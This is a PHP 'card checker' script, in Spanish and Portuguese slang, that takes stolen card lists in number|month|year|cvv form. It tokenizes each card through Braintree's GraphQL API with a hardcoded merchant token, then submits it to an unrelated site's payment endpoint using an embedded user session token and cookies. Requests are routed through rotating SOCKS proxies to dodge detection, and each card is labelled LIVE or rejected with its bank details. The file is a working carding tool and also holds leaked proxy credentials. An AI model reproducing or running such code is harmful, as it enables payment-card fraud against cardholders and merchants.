<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$binn = substr($cc,0,6);


if(strlen($mes<='09')){
        $mes1=substr($mes,1,2);
    } else {
        $mes1=$mes;
    }
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);


if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4";
}

If(strlen($ano) > 2)
{
  $ano = substr($ano,2,2);
}
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
  $nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
  return $nombre;
}
function datosapellido(){
  $apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
  return $apellido;
}


function email($nombre){
  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
  return $email;
}

///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
// $email = email($nombre);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
$username = 'lum-customer-hl_6366aa06-zone-static_res';
$password = 'a9by3kql965v';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);

function ibuuproxy(){
  $poxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($poxySocks)-1);
   $poxySocks = $poxySocks[$myproxy];
 return $poxySocks;
}

$poxySocks5 = ibuuproxy();

$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
$lname = 'Wang';
$email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
 // $email2 = $fname.rand(10,999).'@yopmail.com';
// //$password = 'P@5%Word';
// $password2 = 'Hansabhen1@';
$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);

$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);





// curl_close($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
   curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
   curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1ODk4MjQ4MzYsImp0aSI6IjlhYTBkZGM1LTczYTQtNGNiOC04MTdjLWYwNzMzYzI4MzM2ZiIsInN1YiI6Im13ZndtcjJxamN0djQzbTkiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im13ZndtcjJxamN0djQzbTkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJvcHRpb25zIjp7fX0.s2942yM6xzGj_P98DIoUhor0LbLqNUMrTffficRWOp0DGB1ZQBlajMiFVzu652tdEXpeYPopc5L8ejHWXv-_Ag',
'braintree-version: 2018-05-10',
'content-type: application/json',
'origin: https://assets.braintreegateway.com',
'referer: https://payments.braintree-api.com/',
'user-agent: '.$browser.''
));

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"d74aaa3f-ec5f-4d4f-9b6f-212a0fae6e41"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"Vincent Warner"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');


$a_pago = curl_exec($ch);

$token = trim(strip_tags(getstr($a_pago,'"token":"','"')));

 $country = trim(strip_tags(getstr($a_pago,'"countryOfIssuance":"','"')));
 $bank = trim(strip_tags(getstr($a_pago,'"issuingBank":"','"')));
 $type = trim(strip_tags(getstr($a_pago,'"debit":"','"')));
 // $category = trim(strip_tags(getstr($a_pago,'"card_category":"','"')));
 // $brand = trim(strip_tags(getstr($a_pago,' "card_brand":"','"')));


  // echo $a_pago;





// //////////////////////// START REQUEST 2 ////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.chairmanmom.com/api/users/payment');

//////////////////////// PROXY CALLS ////////////////////////////
//               REMOVE '//' FOR PROXIES TO WORK BELOW

//////////////////////// PROXYSCRAPE
// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
//////////////////////// WEBSHARE
// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");

//////////////////////// MANUAL Proxy List
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST

//////////////////////// LUMINATI
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// End Proxy Calls
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json, text/plain, */*',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: en-US,en;q=0.9',
'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlJrWkNNak00TkVGRU5rTkJNVVpHUTBFNU0wSkNSRUV3TTBReU1UUXhOVEl3T1RSRE9VSTFPQSJ9.eyJodHRwczovL2NoYWlybWFubW9tLmNvbS9yb2xlcyI6WyJ1c2VyIl0sImh0dHBzOi8vY2hhaXJtYW5tb20uY29tL3VzZXJuYW1lIjoiaG90c2hvdDY5Iiwibmlja25hbWUiOiJob3RzaG90NjkiLCJuYW1lIjoidnZhcm5lckBnbWFpbC5jb20iLCJwaWN0dXJlIjoiaHR0cHM6Ly9zLmdyYXZhdGFyLmNvbS9hdmF0YXIvY2FiMzdkMGZmYmM2YzY5Y2E5OTdmYWYyODA1NGNmYzY_cz00ODAmcj1wZyZkPWh0dHBzJTNBJTJGJTJGY2RuLmF1dGgwLmNvbSUyRmF2YXRhcnMlMkZ2di5wbmciLCJ1cGRhdGVkX2F0IjoiMjAyMC0wNS0xN1QxODowMDoyMi43NzNaIiwiZW1haWwiOiJ2dmFybmVyQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiaXNzIjoiaHR0cHM6Ly9hdXRoLmNoYWlybWFubW9tLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZWMxN2JiMDU1OWI2YTBjNTA2YjVlMWMiLCJhdWQiOiJucFY4anVhcml3elo2akF2ZFptTmtHMkZiT1Z0b3AxWCIsImlhdCI6MTU4OTczODQzNCwiZXhwIjoxNTkyMzI5NDM0LCJhdF9oYXNoIjoiZHVCT1hLWEtKQjZEOGMybGRWQWJxdyIsIm5vbmNlIjoiVnVOZXVlbUJKZHN6aFI4M2p4T1oxekZpQlVRaWZuZlAifQ.M_UNyHC1Re4gNrW_LdvVR4JrNgGlW8Uk8n2ibT2bBYvXAErMpfz3d4cA9aw9cHr1vS41CICcKe7zIyECjkSMoBIkPkhZM2k6mYe1qSCP5wqxKMQ9j9T8WlgDbexsVB13SZxxuealwLwUQVEapTjWlxjMkYE-WWYIs2Rq7b3sROueEYIik5C8ObNpXX6VM-RMZGDdyGpXEg013ZOqrPUXwEMEW6QnWDApMXCJ_qmZDLTAkvricJL9yIJJZUdqUf3bK_CAQrg9C8TK_dtP04Z6irA_ewP_M-zbrNTjHQeJ1wRom8xSsF8JRKIxIcCyghI6elkGYrS1O9fdnw6zXmxHyg',
'Content-Type: application/json;charset=UTF-8',
'Cookie: co%2Fverifier%2Fhttps%253A%252F%252Fauth.chairmanmom.com%2FY6H9Y5gBEqz8=%22WPz-XIPiHpmzsTSvRbNYFm4v5zTyTKlE%22; auth0.ssodata=%22{%5C%22lastUsedConnection%5C%22:%5C%22Username-Password-Authentication%5C%22%2C%5C%22lastUsedSub%5C%22:%5C%22auth0|5ec17bb0559b6a0c506b5e1c%5C%22}%22',
'Host: www.chairmanmom.com',
'Origin: https://www.chairmanmom.com',
'Referer: https://www.chairmanmom.com/Signup?step=payment',
'User-Agent: '.$browser.''
));

//////////////////////// START POST FILED 1 ////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_nonce":"'.$token.'"}');

// // // //*****************************************************************************************************************************************************************************************************************************************************************************


$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:'.curl_error($ch);
}
curl_close($ch);
$message = trim(strip_tags(getstr($result,'"reason":"','"')));
// // $code = trim(strip_tags(getstr($result,'"message":"','"')));
// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));



// /////////////////////// RESULT ////////////////////////////////////
if(strpos($result,'"paymentMethod"')){
// updatecart();
        echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';

    }
elseif(strpos($result,'503 Service Temporarily Unavailable')) {

         echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ E R R O R ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';

  }

else {
      echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';

  }
curl_close($curl);
ob_flush();
    // echo $result;
//echo $browser;
?>
